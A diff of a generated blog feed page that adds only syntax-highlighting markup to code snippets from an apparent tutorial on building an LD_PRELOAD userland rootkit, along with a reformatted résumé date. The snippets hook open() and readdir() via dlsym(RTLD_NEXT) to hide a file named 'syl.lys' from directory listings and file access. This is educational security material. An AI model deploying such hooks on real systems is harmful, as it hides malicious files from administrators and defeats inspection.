@@ -145,11 +145,11 @@
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">open&lt;/span> (&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>filename, &lt;span style="color:#66d9ef">int&lt;/span> flags, ...)
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> original_open &lt;span style="color:#f92672">=&lt;/span> dlsym(RTLD_NEXT, &lt;span style="color:#e6db74">&amp;#34;open&amp;#34;&lt;/span>);
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> original_open(filename, flags);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> original_open &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">dlsym&lt;/span>(RTLD_NEXT, &lt;span style="color:#e6db74">&amp;#34;open&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">original_open&lt;/span>(filename, flags);
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>In this code block I&amp;rsquo;ve wrapped the original &lt;code>open&lt;/code> function with our implementation of the &lt;code>open&lt;/code> function. What is left now is to add our &amp;ldquo;malicious&amp;rdquo; part to it.&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (strcmp(filename, MALICIOUS_FILE) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">strcmp&lt;/span>(filename, MALICIOUS_FILE) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> errno &lt;span style="color:#f92672">=&lt;/span> ENOENT; &lt;span style="color:#75715e">// Setting up the error to be ERROR NO ENTRY(ENOENT)
 &lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>; &lt;span style="color:#75715e">// Returning -1 (failure)
@@ -170,13 +170,13 @@
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">open&lt;/span> (&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>filename, &lt;span style="color:#66d9ef">int&lt;/span> flags, ...)
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (strcmp(filename, MALICIOUS_FILE) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">strcmp&lt;/span>(filename, MALICIOUS_FILE) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> errno &lt;span style="color:#f92672">=&lt;/span> ENOENT;
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>;
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> original_open &lt;span style="color:#f92672">=&lt;/span> dlsym(RTLD_NEXT, &lt;span style="color:#e6db74">&amp;#34;open&amp;#34;&lt;/span>);
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> original_open(filename, flags);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> original_open &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">dlsym&lt;/span>(RTLD_NEXT, &lt;span style="color:#e6db74">&amp;#34;open&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">original_open&lt;/span>(filename, flags);
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Let&amp;rsquo;s see if its working&amp;hellip;&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>$ ls
@@ -208,22 +208,22 @@
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">open&lt;/span> (&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>filename, &lt;span style="color:#66d9ef">int&lt;/span> flags, ...)
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (strcmp(filename, MALICIOUS_FILE) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">strcmp&lt;/span>(filename, MALICIOUS_FILE) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> errno &lt;span style="color:#f92672">=&lt;/span> ENOENT;
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>;
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> original_open &lt;span style="color:#f92672">=&lt;/span> dlsym(RTLD_NEXT, &lt;span style="color:#e6db74">&amp;#34;open&amp;#34;&lt;/span>);
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> original_open(filename, flags);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> original_open &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">dlsym&lt;/span>(RTLD_NEXT, &lt;span style="color:#e6db74">&amp;#34;open&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">original_open&lt;/span>(filename, flags);
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> dirent &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#a6e22e">readdir&lt;/span>(DIR &lt;span style="color:#f92672">*&lt;/span>dirp)
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> dirent &lt;span style="color:#f92672">*&lt;/span>ret;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> original_readdir &lt;span style="color:#f92672">=&lt;/span> dlsym(RTLD_NEXT, &lt;span style="color:#e6db74">&amp;#34;readdir&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> original_readdir &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">dlsym&lt;/span>(RTLD_NEXT, &lt;span style="color:#e6db74">&amp;#34;readdir&amp;#34;&lt;/span>);
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span>((ret &lt;span style="color:#f92672">=&lt;/span> original_readdir(dirp))) {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(strstr(ret&lt;span style="color:#f92672">-&amp;gt;&lt;/span>d_name, MALICIOUS_FILE) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span>((ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">original_readdir&lt;/span>(dirp))) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">strstr&lt;/span>(ret&lt;span style="color:#f92672">-&amp;gt;&lt;/span>d_name, MALICIOUS_FILE) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> ret;
@@ -291,18 +291,18 @@
 We can see that internally we have a function that is called &lt;code>print_dir&lt;/code>. I&amp;rsquo;ve truncated the comments of the original source code.&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>...
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print_dir (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#f92672">*&lt;/span>name, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#f92672">*&lt;/span>realname, &lt;span style="color:#66d9ef">bool&lt;/span> command_line_arg)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">print_dir&lt;/span> (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#f92672">*&lt;/span>name, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#f92672">*&lt;/span>realname, &lt;span style="color:#66d9ef">bool&lt;/span> command_line_arg)
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>If we continue further down the function we can see the loop that actually iterates over the files&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>...
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> (true)
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> errno &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> next &lt;span style="color:#f92672">=&lt;/span> readdir (dirp); &lt;span style="color:#75715e">// Here we can see that the loop iterates over readdir as long
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> next &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">readdir&lt;/span> (dirp); &lt;span style="color:#75715e">// Here we can see that the loop iterates over readdir as long
 &lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// as the pointer that readdir returns isn&amp;#39;t null and the errno != 0
 &lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (next)
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span> file_ignored (next&lt;span style="color:#f92672">-&amp;gt;&lt;/span>d_name)) &lt;span style="color:#75715e">// we can see here that it the filename is
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span> &lt;span style="color:#a6e22e">file_ignored&lt;/span> (next&lt;span style="color:#f92672">-&amp;gt;&lt;/span>d_name)) &lt;span style="color:#75715e">// we can see here that it the filename is
 &lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// taken from the next variable, lets look through the source code of `readdir`
 &lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> {
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
@@ -314,8 +314,8 @@ We can see that internally we have a function that is called &lt;code>print_dir&
 &lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> dirent &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#a6e22e">readdir&lt;/span>(DIR &lt;span style="color:#f92672">*&lt;/span>dirp); &lt;span style="color:#75715e">// Signature of the readdir
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> dirent {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ino_t d_ino; &lt;span style="color:#75715e">/* Inode number */&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> off_t d_off; &lt;span style="color:#75715e">/* Not an offset; see below */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">ino_t&lt;/span> d_ino; &lt;span style="color:#75715e">/* Inode number */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">off_t&lt;/span> d_off; &lt;span style="color:#75715e">/* Not an offset; see below */&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">short&lt;/span> d_reclen; &lt;span style="color:#75715e">/* Length of this record */&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> d_type; &lt;span style="color:#75715e">/* Type of file; not supported
 &lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> by all filesystem types */&lt;/span>
@@ -338,14 +338,14 @@ We can see that internally we have a function that is called &lt;code>print_dir&
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// https://man7.org/linux/man-pages/man3/dlsym.3.html
 &lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// Search for RTLD_NEXT, basically it allow us to wrap
 &lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// the original function
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> handle &lt;span style="color:#f92672">=&lt;/span> dlsym(RTLD_NEXT, &lt;span style="color:#e6db74">&amp;#34;readdir&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> handle &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">dlsym&lt;/span>(RTLD_NEXT, &lt;span style="color:#e6db74">&amp;#34;readdir&amp;#34;&lt;/span>)
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> dirent &lt;span style="color:#f92672">*&lt;/span>dp;
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Iterating over the return values of our original `readdir`
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">while&lt;/span>((dp &lt;span style="color:#f92672">=&lt;/span> handle(dirp))) {
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">while&lt;/span>((dp &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">handle&lt;/span>(dirp))) {
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// if our `needle`(our file `syl.lys`) is found in the `haystack`(`dp-&amp;gt;d_name`)
 &lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// break the loop and go to the next entry, essentially skipping our file.
-&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(strstr(dp&lt;span style="color:#f92672">-&amp;gt;&lt;/span>d_name, &lt;span style="color:#e6db74">&amp;#34;syl.lys&amp;#34;&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">strstr&lt;/span>(dp&lt;span style="color:#f92672">-&amp;gt;&lt;/span>d_name, &lt;span style="color:#e6db74">&amp;#34;syl.lys&amp;#34;&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> dp;
@@ -944,7 +944,7 @@ SSH_AUTH_SOCK: $SSH_AUTH_SOCK
 &lt;/span>
 &lt;/h1>&lt;ul>
 &lt;li>
-&lt;p>&lt;a href="https://www.vmware.com/">&lt;strong>VMware&lt;/strong>&lt;/a> (Software Engineer) &amp;gt; Sep 2021 - Present&lt;/p>
+&lt;p>&lt;a href="https://www.vmware.com/">&lt;strong>VMware&lt;/strong>&lt;/a> (Software Engineer) &amp;gt; 2021-09 - Present&lt;/p>
 &lt;p>Projects:&lt;/p>
 &lt;ul>
 &lt;li>&lt;strong>Threat Intelligence Connector for Carbon Black Cloud&lt;/strong> (&lt;a href="https://github.com/carbonblack/carbon-black-cloud-threat-intelligence-connector">https://github.com/carbonblack/carbon-black-cloud-threat-intelligence-connector&lt;/a>) - Main Developer and Maintainer&lt;/li>
